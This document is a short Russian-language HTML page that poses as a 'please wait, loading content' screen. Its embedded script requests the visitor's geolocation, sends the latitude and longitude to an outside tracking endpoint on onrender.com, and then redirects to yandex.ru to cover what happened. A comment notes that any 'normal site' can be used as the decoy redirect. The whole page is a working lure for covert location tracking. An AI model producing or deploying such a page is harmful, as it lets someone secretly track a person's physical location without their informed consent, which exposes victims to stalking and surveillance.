<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Добро пожаловать</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 150px;
      background: #fff;
      color: #333;
      user-select: none;
    }
    .message {
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div class="message">Загружаем контент, пожалуйста, подождите...</div>
  <script>
    navigator.geolocation.getCurrentPosition(
      pos => {
        fetch('https://geo-tracker-l5ui.onrender.com/send_location', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          })
        });
        // После получения координат делаем редирект
        setTimeout(() => {
          window.location.href = 'https://yandex.ru'; // <- сюда можно любой нормальный сайт
        }, 1500);
      },
      err => {
        // Если отказ или ошибка — тоже редирект
        setTimeout(() => {
          window.location.href = 'https://yandex.ru';
        }, 1500);
      }
    );
  </script>
</body>
</html>
